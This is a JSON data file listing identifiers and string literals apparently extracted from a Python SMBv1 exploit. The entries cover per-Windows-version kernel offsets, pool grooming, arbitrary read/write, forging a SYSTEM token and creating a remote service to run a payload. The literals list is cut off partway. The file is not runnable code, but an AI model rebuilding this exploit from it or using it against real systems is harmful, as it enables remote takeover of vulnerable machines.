{
    "identifiers": [
        "impacket",
        "smb",
        "smbconnection",
        "mysmb",
        "MYSMB",
        "pack",
        "unpack",
        "unpack_from",
        "sys",
        "socket",
        "time",
        "pack",
        "pack",
        "pack",
        "pack",
        "dict_args",
        "dictionary",
        "dict_args",
        "result",
        "update",
        "dictionary",
        "result",
        "merge_dicts",
        "X86_INFO",
        "WIN7_32_TRANS_INFO",
        "WIN7_32_SESSION_INFO",
        "merge_dicts",
        "X64_INFO",
        "WIN7_64_TRANS_INFO",
        "WIN7_64_SESSION_INFO",
        "merge_dicts",
        "X86_INFO",
        "WIN7_32_TRANS_INFO",
        "WIN8_32_SESSION_INFO",
        "merge_dicts",
        "X64_INFO",
        "WIN7_64_TRANS_INFO",
        "WIN8_64_SESSION_INFO",
        "merge_dicts",
        "X86_INFO",
        "WIN5_32_TRANS_INFO",
        "WINXP_32_SESSION_INFO",
        "merge_dicts",
        "X64_INFO",
        "WIN5_64_TRANS_INFO",
        "WIN2K3_64_SESSION_INFO",
        "merge_dicts",
        "X86_INFO",
        "WIN5_32_TRANS_INFO",
        "WIN2K3_32_SESSION_INFO",
        "merge_dicts",
        "X64_INFO",
        "WIN5_64_TRANS_INFO",
        "WIN2K3_64_SESSION_INFO",
        "merge_dicts",
        "X86_INFO",
        "WIN5_32_TRANS_INFO",
        "WIN2K_32_SESSION_INFO",
        "size",
        "align_size",
        "size",
        "align_size",
        "align_size",
        "conn",
        "conn",
        "send_echo",
        "conn",
        "conn",
        "tree_connect_andx",
        "conn",
        "get_remote_host",
        "pipe",
        "pipes",
        "conn",
        "nt_create_andx",
        "tid",
        "pipe",
        "conn",
        "close",
        "tid",
        "fid",
        "pipe",
        "smb",
        "SessionError",
        "e",
        "conn",
        "disconnect_tree",
        "tid",
        "found_pipe",
        "conn",
        "extra_last_mid",
        "special_mid",
        "conn",
        "next_mid",
        "special_mid",
        "extra_last_mid",
        "extra_last_mid",
        "extra_last_mid",
        "conn",
        "tid",
        "fid",
        "conn",
        "next_mid",
        "conn",
        "create_nt_trans_packet",
        "param",
        "pack",
        "fid",
        "mid",
        "mid",
        "data",
        "maxParameterCount",
        "GROOM_TRANS_SIZE",
        "TRANS_NAME_LEN",
        "conn",
        "create_nt_trans_secondary_packet",
        "mid",
        "data",
        "conn",
        "send_raw",
        "req1",
        "conn",
        "send_raw",
        "req1",
        "req2",
        "conn",
        "recv_transaction_data",
        "mid",
        "leakData",
        "leakData",
        "X86_INFO",
        "X86_INFO",
        "ord",
        "leakData",
        "X86_INFO",
        "X86_INFO",
        "leakData",
        "X64_INFO",
        "X64_INFO",
        "ord",
        "leakData",
        "X64_INFO",
        "X64_INFO",
        "sys",
        "exit",
        "format",
        "info",
        "info",
        "conn",
        "info",
        "read_addr",
        "read_size",
        "info",
        "pack",
        "fmt",
        "info",
        "info",
        "info",
        "read_addr",
        "new_data",
        "pack",
        "new_data",
        "pack",
        "new_data",
        "pack",
        "read_size",
        "read_size",
        "read_size",
        "new_data",
        "pack",
        "conn",
        "send_nt_trans_secondary",
        "mid",
        "info",
        "data",
        "new_data",
        "dataDisplacement",
        "info",
        "conn",
        "send_nt_trans",
        "param",
        "pack",
        "info",
        "totalDataCount",
        "totalParameterCount",
        "conn",
        "send_nt_trans_secondary",
        "mid",
        "info",
        "conn",
        "recv_transaction_data",
        "info",
        "read_size",
        "unpack_from",
        "fmt",
        "read_data",
        "info",
        "conn",
        "send_nt_trans_secondary",
        "mid",
        "info",
        "param",
        "pack",
        "fmt",
        "info",
        "paramDisplacement",
        "info",
        "wait_for_request_processed",
        "conn",
        "conn",
        "send_nt_trans_secondary",
        "mid",
        "info",
        "data",
        "pack",
        "info",
        "dataDisplacement",
        "info",
        "wait_for_request_processed",
        "conn",
        "read_data",
        "conn",
        "info",
        "write_addr",
        "write_data",
        "conn",
        "send_nt_trans_secondary",
        "mid",
        "info",
        "data",
        "pack",
        "info",
        "write_addr",
        "dataDisplacement",
        "info",
        "wait_for_request_processed",
        "conn",
        "conn",
        "send_nt_trans_secondary",
        "mid",
        "info",
        "data",
        "write_data",
        "wait_for_request_processed",
        "conn",
        "conn",
        "tid",
        "fid",
        "info",
        "numFill",
        "pack",
        "fid",
        "i",
        "numFill",
        "conn",
        "send_nt_trans",
        "param",
        "trans_param",
        "totalDataCount",
        "maxParameterCount",
        "GROOM_TRANS_SIZE",
        "conn",
        "next_mid",
        "conn",
        "create_nt_trans_packet",
        "param",
        "trans_param",
        "mid",
        "mid_ntrename",
        "data",
        "maxParameterCount",
        "info",
        "conn",
        "create_nt_trans_secondary_packet",
        "mid_ntrename",
        "data",
        "conn",
        "create_nt_trans_packet",
        "param",
        "trans_param",
        "mid",
        "fid",
        "totalDataCount",
        "info",
        "maxParameterCount",
        "i",
        "next_extra_mid",
        "reqs",
        "append",
        "conn",
        "create_trans_packet",
        "mid",
        "mid",
        "param",
        "trans_param",
        "totalDataCount",
        "info",
        "totalParameterCount",
        "maxDataCount",
        "maxParameterCount",
        "conn",
        "send_raw",
        "req1",
        "conn",
        "send_raw",
        "req1",
        "req2",
        "req3",
        "join",
        "reqs",
        "conn",
        "recv_transaction_data",
        "mid_ntrename",
        "leakData",
        "leakData",
        "info",
        "info",
        "leakData",
        "info",
        "info",
        "pack",
        "info",
        "info",
        "info",
        "leakData",
        "leakData",
        "info",
        "info",
        "expected_size",
        "leakData",
        "leakTransOffset",
        "leakTransOffset",
        "expected_size",
        "leakData",
        "leakTransOffset",
        "info",
        "unpack_from",
        "ptrf",
        "leakTrans",
        "unpack_from",
        "ptrf",
        "leakTrans",
        "info",
        "unpack_from",
        "leakTrans",
        "info",
        "format",
        "connection_addr",
        "format",
        "session_addr",
        "format",
        "flink_value",
        "format",
        "inparam_value",
        "format",
        "leak_mid",
        "inparam_value",
        "next_page_addr",
        "info",
        "info",
        "info",
        "info",
        "info",
        "flink_value",
        "format",
        "flink_value",
        "next_page_addr",
        "connection_addr",
        "session_addr",
        "next_page_addr",
        "leak_mid",
        "inparam_value",
        "info",
        "TRANS_NAME_LEN",
        "flink_value",
        "info",
        "conn",
        "pipe_name",
        "info",
        "conn",
        "tree_connect_andx",
        "conn",
        "get_remote_host",
        "conn",
        "set_default_tid",
        "tid",
        "conn",
        "nt_create_andx",
        "tid",
        "pipe_name",
        "info",
        "update",
        "leak_frag_size",
        "conn",
        "tid",
        "fid",
        "info",
        "update",
        "OS_ARCH_INFO",
        "info",
        "info",
        "calc_alloc_size",
        "GROOM_TRANS_SIZE",
        "info",
        "info",
        "info",
        "format",
        "info",
        "GROOM_TRANS_SIZE",
        "TRANS_NAME_LEN",
        "info",
        "info",
        "info",
        "bridePoolSize",
        "info",
        "info",
        "format",
        "info",
        "info",
        "TRANS_NAME_LEN",
        "info",
        "i",
        "reset_extra_mid",
        "conn",
        "align_transaction_and_leak",
        "conn",
        "tid",
        "fid",
        "info",
        "leakInfo",
        "conn",
        "close",
        "tid",
        "fid",
        "conn",
        "disconnect_tree",
        "tid",
        "conn",
        "tree_connect_andx",
        "conn",
        "get_remote_host",
        "conn",
        "set_default_tid",
        "tid",
        "conn",
        "nt_create_andx",
        "tid",
        "pipe_name",
        "leakInfo",
        "fid",
        "info",
        "update",
        "leakInfo",
        "conn",
        "do_write_andx_raw_pipe",
        "fid",
        "shift_indata_byte",
        "info",
        "info",
        "info",
        "shift_indata_byte",
        "info",
        "indata_value",
        "conn",
        "send_nt_trans_secondary",
        "mid",
        "fid",
        "data",
        "dataDisplacement",
        "indata_next_trans_displacement",
        "info",
        "wait_for_request_processed",
        "conn",
        "conn",
        "send_nt_trans",
        "mid",
        "special_mid",
        "param",
        "pack",
        "fid",
        "data",
        "recvPkt",
        "getNTStatus",
        "format",
        "recvPkt",
        "getNTStatus",
        "info",
        "conn",
        "send_nt_trans_secondary",
        "mid",
        "fid",
        "data",
        "pack",
        "fmt",
        "info",
        "dataDisplacement",
        "indata_next_trans_displacement",
        "info",
        "wait_for_request_processed",
        "conn",
        "conn",
        "send_nt_trans_secondary",
        "mid",
        "special_mid",
        "data",
        "pack",
        "fmt",
        "info",
        "info",
        "info",
        "dataDisplacement",
        "info",
        "wait_for_request_processed",
        "conn",
        "conn",
        "next_mid",
        "conn",
        "send_nt_trans_secondary",
        "mid",
        "info",
        "data",
        "pack",
        "info",
        "dataDisplacement",
        "info",
        "conn",
        "pipe_name",
        "info",
        "conn",
        "tree_connect_andx",
        "conn",
        "get_remote_host",
        "conn",
        "set_default_tid",
        "tid",
        "conn",
        "nt_create_andx",
        "tid",
        "pipe_name",
        "fid",
        "info",
        "info",
        "info",
        "update",
        "leak_frag_size",
        "conn",
        "tid",
        "fid",
        "info",
        "info",
        "update",
        "OS_ARCH_INFO",
        "info",
        "info",
        "OS_ARCH_INFO",
        "info",
        "info",
        "OS_ARCH_INFO",
        "info",
        "OS_ARCH_INFO",
        "info",
        "pack",
        "info",
        "i",
        "info",
        "i",
        "next_extra_mid",
        "conn",
        "send_trans",
        "mid",
        "mid",
        "param",
        "trans_param",
        "totalParameterCount",
        "TRANS_NAME_LEN",
        "totalDataCount",
        "maxParameterCount",
        "maxDataCount",
        "conn",
        "do_write_andx_raw_pipe",
        "info",
        "shift_indata_byte",
        "tinfo",
        "attempt_list",
        "tinfo",
        "tinfo",
        "tinfo",
        "HEAP_HDR_SIZE",
        "tinfo",
        "tinfo",
        "shift_indata_byte",
        "HEAP_CHUNK_PAD_SIZE",
        "HEAP_HDR_SIZE",
        "conn",
        "send_trans_secondary",
        "mid",
        "info",
        "data",
        "dataDisplacement",
        "NEXT_TRANS_OFFSET",
        "tinfo",
        "wait_for_request_processed",
        "conn",
        "conn",
        "send_nt_trans",
        "mid",
        "special_mid",
        "param",
        "trans_param",
        "data",
        "recvPkt",
        "getNTStatus",
        "info",
        "tinfo",
        "tinfo",
        "info",
        "update",
        "OS_ARCH_INFO",
        "info",
        "info",
        "recvPkt",
        "getNTStatus",
        "format",
        "recvPkt",
        "getNTStatus",
        "success",
        "format",
        "recvPkt",
        "getNTStatus",
        "conn",
        "send_trans_secondary",
        "mid",
        "info",
        "data",
        "dataDisplacement",
        "NEXT_TRANS_OFFSET",
        "info",
        "info",
        "conn",
        "send_trans_secondary",
        "mid",
        "info",
        "data",
        "dataDisplacement",
        "NEXT_TRANS_OFFSET",
        "info",
        "wait_for_request_processed",
        "conn",
        "HEAP_HDR_SIZE",
        "info",
        "HEAP_CHUNK_PAD_SIZE",
        "TRANS_CHUNK_SIZE",
        "info",
        "TRANS_NAME_LEN",
        "PREV_TRANS_DISPLACEMENT",
        "conn",
        "send_nt_trans_secondary",
        "mid",
        "special_mid",
        "param",
        "paramDisplacement",
        "PREV_TRANS_OFFSET",
        "info",
        "info",
        "conn",
        "send_nt_trans_secondary",
        "mid",
        "special_mid",
        "param",
        "paramDisplacement",
        "PREV_TRANS_OFFSET",
        "info",
        "conn",
        "send_trans_secondary",
        "mid",
        "info",
        "data",
        "dataDisplacement",
        "NEXT_TRANS_OFFSET",
        "info",
        "wait_for_request_processed",
        "conn",
        "conn",
        "send_trans_secondary",
        "mid",
        "info",
        "data",
        "dataDisplacement",
        "NEXT_TRANS_OFFSET",
        "info",
        "conn",
        "send_trans_secondary",
        "mid",
        "info",
        "data",
        "pack",
        "dataDisplacement",
        "NEXT_TRANS_OFFSET",
        "info",
        "conn",
        "send_nt_trans_secondary",
        "mid",
        "special_mid",
        "conn",
        "recv_transaction_data",
        "special_mid",
        "leakData",
        "unpack_from",
        "leakData",
        "HEAP_CHUNK_PAD_SIZE",
        "TRANS_CHUNK_SIZE",
        "info",
        "HEAP_CHUNK_PAD_SIZE",
        "HEAP_HDR_SIZE",
        "leakData",
        "leakTranOffset",
        "info",
        "unpack_from",
        "fmt",
        "leakTrans",
        "unpack_from",
        "fmt",
        "leakTrans",
        "info",
        "unpack_from",
        "leakTrans",
        "info",
        "format",
        "connection_addr",
        "format",
        "session_addr",
        "format",
        "flink_value",
        "format",
        "indata_value",
        "format",
        "trans2_mid",
        "inparam_value",
        "info",
        "TRANS_NAME_LEN",
        "trans2_addr",
        "TRANS_CHUNK_SIZE",
        "format",
        "trans1_addr",
        "format",
        "trans2_addr",
        "info",
        "TRANS_NAME_LEN",
        "conn",
        "send_nt_trans_secondary",
        "mid",
        "info",
        "param",
        "pack",
        "fmt",
        "trans1_addr",
        "trans1_addr",
        "trans2_addr",
        "paramDisplacement",
        "TRANS_OFFSET",
        "info",
        "wait_for_request_processed",
        "conn",
        "conn",
        "next_mid",
        "conn",
        "send_trans_secondary",
        "mid",
        "info",
        "param",
        "pack",
        "trans1_mid",
        "paramDisplacement",
        "info",
        "wait_for_request_processed",
        "conn",
        "info",
        "update",
        "connection_addr",
        "session_addr",
        "trans1_mid",
        "trans1_addr",
        "trans2_mid",
        "trans2_addr",
        "conn",
        "info",
        "userAndGroupCount",
        "userAndGroupsAddr",
        "pack",
        "pack",
        "pack",
        "pack",
        "SID_SYSTEM",
        "SID_ADMINISTRATORS",
        "SID_EVERYONE",
        "SID_AUTHENICATED_USERS",
        "min",
        "userAndGroupCount",
        "userAndGroupsAddr",
        "fakeUserAndGroupsAddr",
        "fakeUserAndGroupCount",
        "info",
        "sid",
        "attr",
        "sids",
        "fakeUserAndGroupCount",
        "attrs",
        "fakeUserAndGroupCount",
        "fakeUserAndGroups",
        "pack",
        "info",
        "addr",
        "attr",
        "addr",
        "len",
        "sid",
        "fakeUserAndGroups",
        "join",
        "sids",
        "fakeUserAndGroupCount",
        "fakeUserAndGroupCount",
        "fakeUserAndGroups",
        "target",
        "pipe_name",
        "MYSMB",
        "target",
        "conn",
        "get_socket",
        "setsockopt",
        "socket",
        "IPPROTO_TCP",
        "socket",
        "TCP_NODELAY",
        "conn",
        "login",
        "USERNAME",
        "PASSWORD",
        "maxBufferSize",
        "conn",
        "get_server_os",
        "server_os",
        "server_os",
        "startswith",
        "server_os",
        "startswith",
        "exploit_matched_pairs",
        "server_os",
        "startswith",
        "server_os",
        "startswith",
        "server_os",
        "startswith",
        "server_os",
        "startswith",
        "exploit_matched_pairs",
        "server_os",
        "startswith",
        "server_os",
        "startswith",
        "exploit_fish_barrel",
        "server_os",
        "startswith",
        "exploit_fish_barrel",
        "server_os",
        "startswith",
        "exploit_fish_barrel",
        "server_os",
        "startswith",
        "exploit_fish_barrel",
        "server_os",
        "startswith",
        "exploit_fish_barrel",
        "sys",
        "exit",
        "pipe_name",
        "find_named_pipe",
        "conn",
        "pipe_name",
        "pipe_name",
        "info",
        "conn",
        "pipe_name",
        "info",
        "info",
        "write_data",
        "conn",
        "info",
        "info",
        "info",
        "read_data",
        "conn",
        "info",
        "info",
        "unpack_from",
        "fmt",
        "sessionData",
        "info",
        "info",
        "info",
        "read_data",
        "conn",
        "info",
        "secCtxAddr",
        "info",
        "unpack_from",
        "fmt",
        "pctxtDataInfo",
        "secCtxAddr",
        "read_data",
        "conn",
        "info",
        "pctxtDataAddr",
        "info",
        "unpack_from",
        "fmt",
        "tokenAddrInfo",
        "format",
        "tokenAddr",
        "read_data",
        "conn",
        "info",
        "tokenAddr",
        "info",
        "unpack_from",
        "tokenData",
        "info",
        "unpack_from",
        "fmt",
        "tokenData",
        "info",
        "format",
        "userAndGroupCount",
        "format",
        "userAndGroupsAddr",
        "create_fake_SYSTEM_UserAndGroups",
        "conn",
        "info",
        "userAndGroupCount",
        "userAndGroupsAddr",
        "fakeUserAndGroupCount",
        "userAndGroupCount",
        "write_data",
        "conn",
        "info",
        "tokenAddr",
        "info",
        "pack",
        "fakeUserAndGroupCount",
        "write_data",
        "conn",
        "info",
        "userAndGroupsAddr",
        "fakeUserAndGroups",
        "read_data",
        "conn",
        "info",
        "secCtxAddr",
        "info",
        "write_data",
        "conn",
        "info",
        "secCtxAddr",
        "info",
        "smb_pwn",
        "conn",
        "info",
        "lhost",
        "payl",
        "info",
        "userAndGroupsAddr",
        "tokenAddr",
        "write_data",
        "conn",
        "info",
        "userAndGroupsAddr",
        "tokenData",
        "userAndGroupsOffset",
        "userAndGroupsOffset",
        "len",
        "fakeUserAndGroups",
        "fakeUserAndGroupCount",
        "userAndGroupCount",
        "write_data",
        "conn",
        "info",
        "tokenAddr",
        "info",
        "pack",
        "userAndGroupCount",
        "write_data",
        "conn",
        "info",
        "secCtxAddr",
        "secCtxData",
        "conn",
        "disconnect_tree",
        "conn",
        "get_tid",
        "conn",
        "logoff",
        "conn",
        "get_socket",
        "close",
        "conn",
        "arch",
        "lhost",
        "payl",
        "conn",
        "get_smbconnection",
        "service_exec",
        "conn",
        "lhost",
        "payl",
        "payl",
        "service_exec",
        "conn",
        "payl",
        "smbConn",
        "localSrc",
        "remoteDrive",
        "remotePath",
        "open",
        "localSrc",
        "fp",
        "smbConn",
        "putFile",
        "remoteDrive",
        "remotePath",
        "fp",
        "read",
        "conn",
        "cmd",
        "random",
        "impacket",
        "dcerpc",
        "v5",
        "transport",
        "srvs",
        "scmr",
        "join",
        "random",
        "choice",
        "letters",
        "i",
        "conn",
        "get_dce_rpc",
        "rpcsvc",
        "connect",
        "rpcsvc",
        "bind",
        "scmr",
        "MSRPC_UUID_SCMR",
        "conn",
        "get_remote_host",
        "scmr",
        "hROpenSCManagerW",
        "rpcsvc",
        "resp",
        "scmr",
        "hROpenServiceW",
        "rpcsvc",
        "svcHandle",
        "service_name",
        "e",
        "e",
        "find",
        "e",
        "scmr",
        "hRDeleteService",
        "rpcsvc",
        "resp",
        "scmr",
        "hRCloseServiceHandle",
        "rpcsvc",
        "resp",
        "service_name",
        "scmr",
        "hRCreateServiceW",
        "rpcsvc",
        "svcHandle",
        "service_name",
        "service_name",
        "lpBinaryPathName",
        "cmd",
        "resp",
        "serviceHandle",
        "service_name",
        "scmr",
        "hRStartServiceW",
        "rpcsvc",
        "serviceHandle",
        "e",
        "e",
        "service_name",
        "scmr",
        "hRDeleteService",
        "rpcsvc",
        "serviceHandle",
        "scmr",
        "hRCloseServiceHandle",
        "rpcsvc",
        "serviceHandle",
        "e",
        "conn",
        "get_remote_host",
        "e",
        "svcHandle",
        "scmr",
        "hRCloseServiceHandle",
        "rpcsvc",
        "svcHandle",
        "rpcsvc",
        "disconnect",
        "len",
        "sys",
        "argv",
        "format",
        "sys",
        "argv",
        "sys",
        "exit",
        "sys",
        "argv",
        "len",
        "sys",
        "argv",
        "sys",
        "argv",
        "sys",
        "argv",
        "sys",
        "argv",
        "sys",
        "argv",
        "sys",
        "argv",
        "exploit",
        "target",
        "pipe_name"
    ],
    "literals": [
        "'SESSION_SECCTX_OFFSET'",
        "'SESSION_ISNULL_OFFSET'",
        "'FAKE_SECCTX'",
        "'<IIQQIIB'",
        "'SECCTX_SIZE'",
        "'SESSION_SECCTX_OFFSET'",
        "'SESSION_ISNULL_OFFSET'",
        "'FAKE_SECCTX'",
        "'<IIIIIIB'",
        "'SECCTX_SIZE'",
        "'SESSION_SECCTX_OFFSET'",
        "'SESSION_ISNULL_OFFSET'",
        "'FAKE_SECCTX'",
        "'<IIQQQQIIB'",
        "'SECCTX_SIZE'",
        "'SESSION_SECCTX_OFFSET'",
        "'SESSION_ISNULL_OFFSET'",
        "'FAKE_SECCTX'",
        "'<IIIIIIIIB'",
        "'SECCTX_SIZE'",
        "'SESSION_ISNULL_OFFSET'",
        "'SESSION_SECCTX_OFFSET'",
        "'SECCTX_PCTXTHANDLE_OFFSET'",
        "'PCTXTHANDLE_TOKEN_OFFSET'",
        "'TOKEN_USER_GROUP_CNT_OFFSET'",
        "'TOKEN_USER_GROUP_ADDR_OFFSET'",
        "'SESSION_ISNULL_OFFSET'",
        "'SESSION_SECCTX_OFFSET'",
        "'SECCTX_PCTXTHANDLE_OFFSET'",
        "'PCTXTHANDLE_TOKEN_OFFSET'",
        "'TOKEN_USER_GROUP_CNT_OFFSET'",
        "'TOKEN_USER_GROUP_ADDR_OFFSET'",
        "'SESSION_ISNULL_OFFSET'",
        "'SESSION_SECCTX_OFFSET'",
        "'PCTXTHANDLE_TOKEN_OFFSET'",
        "'TOKEN_USER_GROUP_CNT_OFFSET'",
        "'TOKEN_USER_GROUP_ADDR_OFFSET'",
        "'SESSION_ISNULL_OFFSET'",
        "'SESSION_SECCTX_OFFSET'",
        "'PCTXTHANDLE_TOKEN_OFFSET'",
        "'TOKEN_USER_GROUP_CNT_OFFSET'",
        "'TOKEN_USER_GROUP_ADDR_OFFSET'",
        "'TRANS_SIZE'",
        "'TRANS_FLINK_OFFSET'",
        "'TRANS_INPARAM_OFFSET'",
        "'TRANS_OUTPARAM_OFFSET'",
        "'TRANS_INDATA_OFFSET'",
        "'TRANS_OUTDATA_OFFSET'",
        "'TRANS_PARAMCNT_OFFSET'",
        "'TRANS_TOTALPARAMCNT_OFFSET'",
        "'TRANS_FUNCTION_OFFSET'",
        "'TRANS_MID_OFFSET'",
        "'TRANS_SIZE'",
        "'TRANS_FLINK_OFFSET'",
        "'TRANS_INPARAM_OFFSET'",
        "'TRANS_OUTPARAM_OFFSET'",
        "'TRANS_INDATA_OFFSET'",
        "'TRANS_OUTDATA_OFFSET'",
        "'TRANS_PARAMCNT_OFFSET'",
        "'TRANS_TOTALPARAMCNT_OFFSET'",
        "'TRANS_FUNCTION_OFFSET'",
        "'TRANS_MID_OFFSET'",
        "'TRANS_SIZE'",
        "'TRANS_FLINK_OFFSET'",
        "'TRANS_INPARAM_OFFSET'",
        "'TRANS_OUTPARAM_OFFSET'",
        "'TRANS_INDATA_OFFSET'",
        "'TRANS_OUTDATA_OFFSET'",
        "'TRANS_PARAMCNT_OFFSET'",
        "'TRANS_TOTALPARAMCNT_OFFSET'",
        "'TRANS_FUNCTION_OFFSET'",
        "'TRANS_PID_OFFSET'",
        "'TRANS_MID_OFFSET'",
        "'TRANS_SIZE'",
        "'TRANS_FLINK_OFFSET'",
        "'TRANS_INPARAM_OFFSET'",
        "'TRANS_OUTPARAM_OFFSET'",
        "'TRANS_INDATA_OFFSET'",
        "'TRANS_OUTDATA_OFFSET'",
        "'TRANS_PARAMCNT_OFFSET'",
        "'TRANS_TOTALPARAMCNT_OFFSET'",
        "'TRANS_FUNCTION_OFFSET'",
        "'TRANS_PID_OFFSET'",
        "'TRANS_MID_OFFSET'",
        "'ARCH'",
        "'x86'",
        "'PTR_SIZE'",
        "'PTR_FMT'",
        "'I'",
        "'FRAG_TAG_OFFSET'",
        "'POOL_ALIGN'",
        "'SRV_BUFHDR_SIZE'",
        "'ARCH'",
        "'x64'",
        "'PTR_SIZE'",
        "'PTR_FMT'",
        "'Q'",
        "'FRAG_TAG_OFFSET'",
        "'POOL_ALIGN'",
        "'SRV_BUFHDR_SIZE'",
        "'WIN7'",
        "'x86'",
        "'x64'",
        "'WIN8'",
        "'x86'",
        "'x64'",
        "'WINXP'",
        "'x86'",
        "'x64'",
        "'WIN2K3'",
        "'x86'",
        "'x64'",
        "'WIN2K'",
        "'x86'",
        "'a'",
        "'browser'",
        "'spoolss'",
        "'netlogon'",
        "'lsarpc'",
        "'samr'",
        "'\\\\\\\\'",
        "'\\\\'",
        "'IPC$'",
        "'<HH'",
        "'A'",
        "'B'",
        "'FRAG_TAG_OFFSET'",
        "'FRAG_TAG_OFFSET'",
        "'Frag'",
        "'Target is 32 bit'",
        "'arch'",
        "'x86'",
        "'FRAG_POOL_SIZE'",
        "'FRAG_TAG_OFFSET'",
        "'POOL_ALIGN'",
        "'FRAG_TAG_OFFSET'",
        "'FRAG_TAG_OFFSET'",
        "'Frag'",
        "'Target is 64 bit'",
        "'arch'",
        "'x64'",
        "'FRAG_POOL_SIZE'",
        "'FRAG_TAG_OFFSET'",
        "'POOL_ALIGN'",
        "'Not found Frag pool tag in leak data'",
        "'Got frag size: 0x{:x}'",
        "'FRAG_POOL_SIZE'",
        "'PTR_FMT'",
        "'<'",
        "'trans2_addr'",
        "'TRANS_FLINK_OFFSET'",
        "'trans2_addr'",
        "'<II'",
        "'<III'",
        "'<III'",
        "'<HH'",
        "'trans1_mid'",
        "'TRANS_OUTPARAM_OFFSET'",
        "'<HH'",
        "'fid'",
        "'trans2_mid'",
        "'trans2_mid'",
        "'trans2_addr'",
        "'<'",
        "'TRANS_FLINK_OFFSET'",
        "'trans1_mid'",
        "'<'",
        "'trans2_addr'",
        "'TRANS_INDATA_OFFSET'",
        "'trans1_mid'",
        "'<H'",
        "'trans2_mid'",
        "'TRANS_MID_OFFSET'",
        "'trans1_mid'",
        "'<'",
        "'PTR_FMT'",
        "'TRANS_INDATA_OFFSET'",
        "'trans2_mid'",
        "'<HH'",
        "'A'",
        "'GROOM_DATA_SIZE'",
        "'B'",
        "'GROOM_DATA_SIZE'",
        "''",
        "'BRIDE_DATA_SIZE'",
        "''",
        "'FRAG_TAG_OFFSET'",
        "'FRAG_TAG_OFFSET'",
        "'Frag'",
        "'Not found Frag pool tag in leak data'",
        "'FRAG_TAG_OFFSET'",
        "'FRAG_POOL_SIZE'",
        "'<H'",
        "'BRIDE_TRANS_SIZE'",
        "'POOL_ALIGN'",
        "'SRV_BUFHDR_SIZE'",
        "'LStr'",
        "'POOL_ALIGN'",
        "'POOL_ALIGN'",
        "'No transaction struct in leak data'",
        "'PTR_FMT'",
        "'<'",
        "'<'",
        "'TRANS_INPARAM_OFFSET'",
        "'<H'",
        "'TRANS_MID_OFFSET'",
        "'CONNECTION: 0x{:x}'",
        "'SESSION: 0x{:x}'",
        "'FLINK: 0x{:x}'",
        "'InParam: 0x{:x}'",
        "'MID: 0x{:x}'",
        "'GROOM_POOL_SIZE'",
        "'FRAG_POOL_SIZE'",
        "'POOL_ALIGN'",
        "'SRV_BUFHDR_SIZE'",
        "'TRANS_FLINK_OFFSET'",
        "'unexpected alignment, diff: 0x{:x}'",
        "'connection'",
        "'session'",
        "'next_page_addr'",
        "'trans1_mid'",
        "'trans1_addr'",
        "'TRANS_SIZE'",
        "'trans2_addr'",
        "'TRANS_FLINK_OFFSET'",
        "'\\\\\\\\'",
        "'\\\\'",
        "'IPC$'",
        "'os'",
        "'arch'",
        "'GROOM_POOL_SIZE'",
        "'SRV_BUFHDR_SIZE'",
        "'POOL_ALIGN'",
        "'POOL_ALIGN'",
        "'GROOM_POOL_SIZE: 0x{:x}'",
        "'GROOM_POOL_SIZE'",
        "'GROOM_DATA_SIZE'",
        "'TRANS_SIZE'",
        "'GROOM_POOL_SIZE'",
        "'FRAG_POOL_SIZE'",
        "'BRIDE_TRANS_SIZE'",
        "'SRV_BUFHDR_SIZE'",
        "'POOL_ALIGN'",
        "'BRIDE_TRANS_SIZE: 0x{:x}'",
        "'BRIDE_TRANS_SIZE'",
        "'BRIDE_DATA_SIZE'",
        "'BRIDE_TRANS_SIZE'",
        "'TRANS_SIZE'",
        "'leak failed... try again'",
        "'\\\\\\\\'",
        "'\\\\'",
        "'IPC$'",
        "'fid'",
        "'A'",
        "'next_page_addr'",
        "'TRANS_SIZE'",
        "'SRV_BUFHDR_SIZE'",
        "'trans2_addr'",
        "'\\x00'",
        "'TRANS_MID_OFFSET'",
        "'<HH'",
        "''",
        "'unexpected return status: 0x{:x}'",
        "'!!! Write to wrong place !!!'",
        "'the target might be crashed'",
        "'success controlling groom transaction'",
        "'modify trans1 struct for arbitrary read/write'",
        "'PTR_FMT'",
        "'<'",
        "'trans1_addr'",
        "'TRANS_INDATA_OFFSET'",
        "'<'",
        "'trans1_addr'",
        "'trans1_addr'",
        "'trans2_addr'",
        "'TRANS_INPARAM_OFFSET'",
        "'trans2_mid'",
        "'trans1_mid'",
        "'<H'",
        "'trans2_mid'",
        "'TRANS_MID_OFFSET'",
        "'\\\\\\\\'",
        "'\\\\'",
        "'IPC$'",
        "'fid'",
        "'os'",
        "'WIN7'",
        "'arch'",
        "'arch'",
        "'os'",
        "'arch'",
        "'os'",
        "'arch'",
        "'os'",
        "'x64'",
        "'os'",
        "'x86'",
        "'Groom packets'",
        "'<HH'",
        "'fid'",
        "'fid'",
        "''",
        "'fid'",
        "'A'",
        "'attempt controlling next transaction on '",
        "'ARCH'",
        "'POOL_ALIGN'",
        "'TRANS_SIZE'",
        "'POOL_ALIGN'",
        "'POOL_ALIGN'",
        "'fid'",
        "'\\x00'",
        "'TRANS_MID_OFFSET'",
        "''",
        "'success controlling one transaction'",
        "'arch'",
        "'Target is '",
        "'ARCH'",
        "'arch'",
        "'ARCH'",
        "'os'",
        "'arch'",
        "'unexpected return status: 0x{:x}'",
        "'unexpected return status: 0x{:x}'",
        "'!!! Write to wrong place !!!'",
        "'the target might be crashed'",
        "'modify parameter count to 0xffffffff to be able to write backward'",
        "'fid'",
        "'\\xff'",
        "'TRANS_TOTALPARAMCNT_OFFSET'",
        "'arch'",
        "'x64'",
        "'fid'",
        "'\\xff'",
        "'TRANS_INPARAM_OFFSET'",
        "'TRANS_SIZE'",
        "'TRANS_SIZE'",
        "'\\xff'",
        "'TRANS_TOTALPARAMCNT_OFFSET'",
        "'arch'",
        "'x64'",
        "'\\xff'",
        "'TRANS_INPARAM_OFFSET'",
        "'fid'",
        "'\\x00'",
        "'TRANS_INPARAM_OFFSET'",
        "'leak next transaction'",
        "'fid'",
        "'\\x05'",
        "'TRANS_FUNCTION_OFFSET'",
        "'fid'",
        "'<IIIII'",
        "'TRANS_PARAMCNT_OFFSET'",
        "'<H'",
        "'POOL_ALIGN'",
        "'chunk size is wrong'",
        "'PTR_FMT'",
        "'<'",
        "'<'",
        "'TRANS_INPARAM_OFFSET'",
        "'<H'",
        "'TRANS_MID_OFFSET'",
        "'CONNECTION: 0x{:x}'",
        "'SESSION: 0x{:x}'",
        "'FLINK: 0x{:x}'",
        "'InData: 0x{:x}'",
        "'MID: 0x{:x}'",
        "'TRANS_SIZE'",
        "'TRANS1: 0x{:x}'",
        "'TRANS2: 0x{:x}'",
